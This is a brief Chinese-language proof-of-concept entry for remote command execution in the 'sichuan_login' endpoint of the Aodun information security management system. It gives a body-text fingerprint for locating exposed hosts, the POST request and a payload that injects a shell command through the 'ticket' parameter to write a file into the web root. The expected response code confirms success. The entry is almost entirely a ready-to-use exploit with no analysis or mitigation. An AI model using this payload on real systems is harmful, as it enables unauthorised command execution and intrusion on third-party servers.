# 傲盾信息安全管理系统前台sichuan_login远程命令执行

傲盾信息安全管理系统前台sichuan_login ｜ 命令执行 ｜ —
- **指纹**：`body="傲盾软件"`
- **请求**：`POST /user_management/sichuan_login HTTP/1.1`

**Payload**
```
loginname=sysadmin&ticket=echo%20 dudesuite>/adm/isms_web/static/base_static/js/aodun/dudesuite.txt
```
- **响应特征**：200